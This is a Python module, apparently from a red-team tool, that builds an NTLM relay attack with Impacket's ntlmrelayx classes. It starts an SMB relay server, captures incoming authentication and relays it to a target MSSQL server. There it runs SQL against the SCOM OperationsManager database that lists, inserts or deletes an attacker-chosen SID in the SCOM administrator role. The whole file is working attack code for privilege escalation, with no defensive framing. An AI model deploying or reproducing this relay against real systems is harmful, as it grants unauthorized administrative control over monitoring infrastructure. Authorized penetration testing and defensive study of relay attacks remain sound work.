import time
import logging
from threading import Lock

from impacket.examples.ntlmrelayx.servers import SMBRelayServer
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
from impacket.ldap import ldaptypes
from impacket import LOG as impacket_logger

# Import the pre-populated protocol clients and attacks dictionaries
from impacket.examples.ntlmrelayx.clients import PROTOCOL_CLIENTS
from impacket.examples.ntlmrelayx.attacks import PROTOCOL_ATTACKS

from lib.logger import logger


class MSSQLSCOMRELAY:
    def __init__(self, target: str, sid: str, interface: str, port: int, 
                 timeout: int, operation_mode: str, verbose: bool):
        self.target = target
        self.sid = sid
        self.interface = interface
        self.port = port
        self.timeout = timeout
        self.operation_mode = operation_mode
        self.verbose = verbose
        self.attacked_targets = []
        self.attack_lock = Lock()
        self.server = None
        self.query = None

        # Build the appropriate SQL query based on operation mode
        self.query = self.build_query()

        # Ensure target has proper format
        if not self.target.startswith("mssql://"):
            self.target = f"mssql://{self.target}"
        
        logger.info(f"Targeting MSSQL server at {self.target}")
        logger.info(f"Operation mode: {self.operation_mode}")

        # Set up the relay configuration using Impacket's protocol dictionaries
        target_processor = TargetsProcessor(
            singleTarget=self.target,
            protocolClients=PROTOCOL_CLIENTS
        )

        config = NTLMRelayxConfig()
        config.setTargets(target_processor)
        
        # Set protocol clients and attacks - this is what ntlmrelayx does!
        config.setProtocolClients(PROTOCOL_CLIENTS)
        config.setAttacks(PROTOCOL_ATTACKS)
        if self.verbose:
            logger.info(f"[DEBUG] Registered protocol clients: {list(PROTOCOL_CLIENTS.keys())}")
            logger.info(f"[DEBUG] Registered attacks: {list(PROTOCOL_ATTACKS.keys())}")
        
        # Set the MSSQL query - this is how ntlmrelayx does it with -q flag
        config.setMSSQLOptions([self.query])
        if self.verbose:
            logger.info(f"[DEBUG] Set MSSQL query via setMSSQLOptions: {self.query}")
        
        config.setListeningPort(port)
        config.setInterfaceIp(interface)
        config.setSMB2Support(True)
        config.setMode("RELAY")
        config.setOutputFile(None)

        self.server = SMBRelayServer(config)
        if self.verbose:
            logger.info("[DEBUG] SMBRelayServer created successfully")

    def convert_string_sid(self, sid):
        """Convert string SID to hex format for SQL query"""
        try:
            hexsid = ldaptypes.LDAP_SID()
            hexsid.fromCanonical(sid)
            querysid = ('0x' + ''.join('{:02X}'.format(b) for b in hexsid.getData()))
            logger.info(f'[*] Converted {sid} to {querysid}')
            return querysid
        except Exception as e:
            logger.info(f"Error converting SID: {str(e)}")
            return None

    def build_query(self):
        """Build the appropriate SQL query based on operation mode"""
        if self.operation_mode == 'list':
            query = "Use OperationsManager; SELECT * FROM AzMan_Role_SIDMember WHERE RoleID = 1;"
            logger.debug(f"Built list query: {query}")
            return query
        
        # For insert/delete, we need to convert the SID
        if not self.sid:
            logger.info("Error: SID is required for insert/delete operations")
            return None

        # Check if SID is already in hex format
        if self.sid.startswith("0x"):
            hex_sid = self.sid
            logger.info(f"[*] Using provided hex SID: {hex_sid}")
        else:
            hex_sid = self.convert_string_sid(self.sid)
            if not hex_sid:
                return None

        if self.operation_mode == 'delete':
            query = f"Use OperationsManager; DELETE FROM AzMan_Role_SIDMember WHERE RoleID = '1' AND MemberSID = {hex_sid};"
        else:  # update/insert mode
            query = f"Use OperationsManager; INSERT INTO AzMan_Role_SIDMember (RoleID, MemberSID) Values ('1', {hex_sid});"
        
        logger.debug(f"Built query: {query}")
        return query

    def start(self):
        """Start the relay server"""
        if not self.query:
            logger.info("Error: Failed to build SQL query. Exiting.")
            return

        # Configure Impacket's logger to show relay messages
        impacket_logger.setLevel(logging.INFO)
        
        logger.info(f"Listening on {self.interface}:{self.port}")
        logger.info("Waiting for incoming connections...")
        
        # Print helpful message based on operation mode
        if self.operation_mode == 'list':
            logger.info("[*] Relay will list SCOM admin role members when authentication is received")
        elif self.operation_mode == 'delete':
            logger.info("[*] Relay will remove SID from SCOM admin role when authentication is received")
        else:
            logger.info("[*] Relay will add SID to SCOM admin role when authentication is received")

        try:
            if self.verbose:
                logger.info("[DEBUG] About to call self.server.start()...")
            self.server.start()
            if self.verbose:
                logger.info("[DEBUG] self.server.start() completed")
        except Exception as e:
            logger.info(f"[ERROR] Exception starting server: {e}")
            import traceback
            logger.info(f"[ERROR] Traceback:\n{traceback.format_exc()}")
            return

        if self.verbose:
            logger.info("[DEBUG] Entering main loop...")
        try:
            while True:
                time.sleep(0.1)
        except KeyboardInterrupt:
            logger.info("Keyboard interrupt, exiting...")
            self.shutdown()
        except Exception as e:
            logger.info(f"[ERROR] Exception in main loop: {e}")
            import traceback
            logger.info(f"[ERROR] Traceback:\n{traceback.format_exc()}")

    def shutdown(self):
        logger.info("Job done...")
        exit()